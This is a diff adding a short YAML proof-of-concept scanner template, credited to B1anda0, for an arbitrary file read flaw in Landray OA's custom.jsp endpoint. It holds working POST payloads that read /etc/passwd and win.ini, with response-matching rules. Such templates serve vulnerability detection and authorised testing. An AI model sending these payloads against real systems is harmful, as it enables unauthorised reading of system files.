@@ -1,0 +1,23 @@
+name: poc-yaml-landray-oa-custom-jsp-fileread
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: POST
+            path: /sys/ui/extend/varkind/custom.jsp
+            body: var={"body":{"file":"file:///etc/passwd"}}
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    windows0:
+        request:
+            cache: true
+            method: POST
+            path: /sys/ui/extend/varkind/custom.jsp
+            body: var={"body":{"file":"file:///c://windows/win.ini"}}
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: windows0() || linux0()
+detail:
+    author: B1anda0(https://github.com/B1anda0)
+    links:
+        - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
